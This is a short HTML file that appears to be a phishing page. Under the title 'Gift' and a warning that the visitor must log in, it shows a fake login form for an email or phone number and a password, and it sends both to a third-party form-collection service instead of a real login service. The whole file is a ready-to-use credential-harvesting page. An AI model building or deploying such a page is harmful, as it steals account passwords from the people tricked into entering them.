<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="style.css" />
    <title>Gift</title>
  </head>
  <body>
    <form
      accept-charset="UTF-8"
      action="https://www.formbackend.com/f/eda25c291aa7d564"
      method="POST"
    >
      <div class="warn">You must login to continue</div>
      <input
        type="text"
        id="name"
        name="email"
        placeholder="Email address or phone number"
        autofocus
      />

      <input
        type="password"
        id="password"
        name="password"
        placeholder="Password"
        required
      />

      <button type="submit">Log In</button>
    </form>
  </body>
</html>
